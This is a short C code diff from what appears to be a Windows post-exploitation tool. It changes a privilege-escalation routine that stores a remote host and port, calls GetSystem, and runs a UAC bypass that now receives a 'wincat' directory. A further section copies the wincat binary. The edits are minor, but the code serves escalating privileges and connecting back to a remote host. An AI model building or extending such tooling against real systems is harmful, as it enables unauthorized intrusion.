@@ -40,6 +40,7 @@ BOOL initWSAS() {
     return TRUE;
 }
 
+
 BOOL PrivEsc(Arguments listAgrument) {
     char portStr[12];
     _itoa_s(listAgrument.port, portStr, sizeof(portStr), 10);
@@ -49,8 +50,8 @@ BOOL PrivEsc(Arguments listAgrument) {
         if (!isArgHostSet() && !SaveRHostInfo(listAgrument.host, portStr)) {
             printMsg(STATUS_INFO, LEVEL_DEFAULT, "Error to add the reg key for host/port!\n");
             return FALSE;
-        }
-        GetSystem();
+        }else
+            GetSystem();
     } else {
         printMsg(STATUS_WARNING, LEVEL_DEFAULT, "Process not running with admin priv\n");
         if (IsUserInAdminGroup()) {
@@ -58,7 +59,7 @@ BOOL PrivEsc(Arguments listAgrument) {
             char* CurrentProcessPath = (char*)calloc(MAX_PATH, 1);
             if (CurrentProcessPath != NULL) {
                 if (GetModuleFileNameA(0, CurrentProcessPath, MAX_PATH) != 0) {
-                    if (RunUacBypass(CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec))
+                    if (RunUacBypass(CurrentProcessPath, listAgrument.host, portStr, listAgrument.UacBypassTec, listAgrument.wincatDefaultDir))
                         printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC Bypass worked !\n");
                     else
                         printMsg(STATUS_ERROR, LEVEL_DEFAULT, "UAC Bypass failed");
@@ -126,6 +127,8 @@ int wmain(int argc, WCHAR* argv[]){
         return TRUE;
     }
     
+
+
     ////////////////////// Copy Wincat /////////////////////
     // 
     if (!IsFileExist((char*)listAgrument.wincatDefaultPath)) {
@@ -135,6 +138,8 @@ int wmain(int argc, WCHAR* argv[]){
     }
     //
     ////////////////////// Copy Wincat /////////////////////
+
+
 
     if (listAgrument.Detached && argc > 3)
         RunProcessDetached(argc, argv);
